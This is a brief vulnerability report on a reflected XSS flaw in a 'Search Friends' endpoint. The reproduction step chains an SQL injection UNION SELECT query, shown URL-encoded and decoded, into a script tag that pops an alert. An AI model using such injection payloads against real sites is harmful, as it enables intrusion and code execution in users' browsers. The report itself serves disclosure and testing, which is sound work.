# Vulnerability 17: Reflected XSS

- Vulnerability: XSS (Reflected)
- Where: Search Friends endpoint
- Impact: Allows attacker to exeute arbitrary code in the victim's browser (if the victim visits the malicious link)

## Steps to reproduce

Using the SQL injection reported [here](search_friend_1.md), we can display the XSS payload in the victim's browser:
1. Visit `friends?search=%27+AND+1%3D0+UNION+SELECT+1%2C+2%2C+%27%3Cscript%3Ealert%28%29%3C%2Fscript%3E%27%2C+4%2C+5+%23` (`friends?search=' AND 1=0 UNION SELECT 1, 2, '<script>alert()</script>', 4, 5 #` URLencoded)
2. It will display an alert

Since it is possible to inject any code block, we are able to explore this vulnerability in many ways. We described some of them [here](stored_xss.md)


[POC](xss_3.py)
